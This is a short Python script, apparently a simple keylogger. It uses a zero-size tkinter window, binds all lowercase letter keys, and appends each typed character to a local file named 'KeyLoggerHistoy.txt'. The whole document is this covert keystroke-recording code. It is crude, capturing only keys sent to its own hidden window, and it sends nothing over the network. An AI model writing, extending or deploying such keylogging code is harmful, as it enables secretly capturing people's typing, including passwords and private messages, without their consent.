from tkinter import *
import string

root = Tk()
root.geometry("0x0")

def writeIt(letter):
    try:
        with open("KeyLoggerHistoy.txt") as f: None        
        with open("KeyLoggerHistoy.txt",'a') as f:
            f.write(letter.char)
        return None
    except:
        with open("KeyLoggerHistoy.txt",'w') as f: None
        with open("KeyLoggerHistoy.txt",'a') as f:
            f.write(letter.char)
        return None

allLetters = string.ascii_lowercase

for i in allLetters:
    root.bind(i,lambda ev:writeIt(ev))

root.mainloop()
